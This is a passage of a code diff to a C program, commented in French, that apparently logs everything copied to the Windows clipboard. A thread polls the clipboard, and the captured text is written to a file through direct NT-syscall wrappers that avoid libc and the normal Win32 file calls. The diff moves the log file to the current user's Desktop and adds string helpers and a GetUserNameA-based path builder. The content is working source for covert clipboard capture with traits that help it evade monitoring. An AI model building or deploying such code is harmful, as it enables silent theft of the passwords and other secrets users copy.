@@ -16,25 +16,65 @@
 
 // Intervalle de scrutation en millisecondes
 #define POLLING_INTERVAL 500
-// Utilisation d'un chemin NT pour l'écriture via syscalls
-#define LOG_FILE_NAME L"\\??\\C:\\Users\\Public\\Documents\\clipboard_log.txt"
+#define LOG_FILE_NAME_SUFFIX L"\\Desktop\\clipboard_log.txt"
+#define NT_PATH_PREFIX L"\\??\\C:\\Users\\"
 
 // Variables globales
 HINSTANCE g_hInstance = NULL;
 HANDLE g_hThread = NULL;
 BOOL g_bRunning = TRUE;
 
-// Définition de wcslen et strlen pour éviter la dépendance à la libc
-size_t wcslen(const wchar_t *s) {
+// Définition de fonctions utilitaires locales pour éviter la dépendance à la libc
+size_t _wcslen(const wchar_t *s) {
     const wchar_t *p = s;
     while (*p) ++p;
     return p - s;
 }
 
-size_t strlen(const char *s) {
+size_t _strlen(const char *s) {
     const char *p = s;
     while (*p) ++p;
     return p - s;
+}
+
+/**
+ * @brief Copie une chaîne de caractères large.
+ */
+void _wcscpy(wchar_t* dest, const wchar_t* src) {
+    while ((*dest++ = *src++));
+}
+
+/**
+ * @brief Concatène deux chaînes de caractères larges.
+ */
+void _wcscat(wchar_t* dest, const wchar_t* src) {
+    while (*dest) dest++;
+    while ((*dest++ = *src++));
+}
+
+/**
+ * @brief Récupère le chemin du fichier de log sur le bureau de l'utilisateur actuel.
+ */
+BOOL GetLogFilePath(wchar_t* buffer, size_t maxCount) {
+    char username[256];
+    DWORD usernameLen = sizeof(username);
+    
+    // Utilisation de GetUserNameA (nécessite advapi32.lib)
+    if (GetUserNameA(username, &usernameLen)) {
+        wchar_t wUsername[256];
+        // Conversion simple ASCII vers WCHAR
+        for (DWORD i = 0; i < usernameLen; i++) {
+            wUsername[i] = (wchar_t)username[i];
+        }
+        wUsername[usernameLen] = L'\0';
+
+        // Construction du chemin NT : \??\C:\Users\<USER>\Desktop\clipboard_log.txt
+        _wcscpy(buffer, NT_PATH_PREFIX);
+        _wcscat(buffer, wUsername);
+        _wcscat(buffer, LOG_FILE_NAME_SUFFIX);
+        return TRUE;
+    }
+    return FALSE;
 }
 
 /**
@@ -43,6 +83,9 @@ size_t strlen(const char *s) {
 void LogClipboardText(const char* text) {
     if (!text || text[0] == '\0') return;
 
+    wchar_t logPath[MAX_PATH];
+    if (!GetLogFilePath(logPath, MAX_PATH)) return;
+
     HANDLE hFile;
     OBJECT_ATTRIBUTES objAttr;
     UNICODE_STRING uniName;
@@ -50,9 +93,9 @@ void LogClipboardText(const char* text) {
     NTSTATUS status;
 
     // Initialisation du nom du fichier (format NT)
-    uniName.Buffer = (PWSTR)LOG_FILE_NAME;
-    uniName.Length = (USHORT)(wcslen(LOG_FILE_NAME) * sizeof(WCHAR));
-    uniName.MaximumLength = uniName.Length;
+    uniName.Buffer = logPath;
+    uniName.Length = (USHORT)(_wcslen(logPath) * sizeof(WCHAR));
+    uniName.MaximumLength = (USHORT)(MAX_PATH * sizeof(WCHAR));
 
     InitializeObjectAttributes(&objAttr, &uniName, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
@@ -72,9 +115,9 @@ void LogClipboardText(const char* text) {
     );
 
     if (status == 0) { // STATUS_SUCCESS
-        SIZE_T len = strlen(text);
+        SIZE_T len = _strlen(text);
         const char* separator = "\r\n-----------------------------------\r\n";
-        SIZE_T sepLen = strlen(separator);
+        SIZE_T sepLen = _strlen(separator);
 
         // Écriture du texte via dWriteFile (NtWriteFile)
         dWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, (PVOID)text, (ULONG)len, NULL, NULL);
